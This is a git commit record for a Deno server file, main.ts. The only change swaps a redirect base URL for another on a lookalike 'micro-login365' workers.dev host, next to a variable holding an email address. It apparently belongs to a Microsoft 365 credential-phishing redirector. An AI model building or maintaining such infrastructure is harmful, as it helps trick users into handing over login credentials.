f479477dcf2302fde9d95e4249a3a856eea6f42d
tailopez147 <49619133+tailopez147@users.noreply.github.com>
2026-06-19 16:28:55 +0300

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://authlog.micro-login365.workers.dev/";
+    "https://oauth-log.micro-login365.workers.dev/";
 
   let email: string | null = null;
 
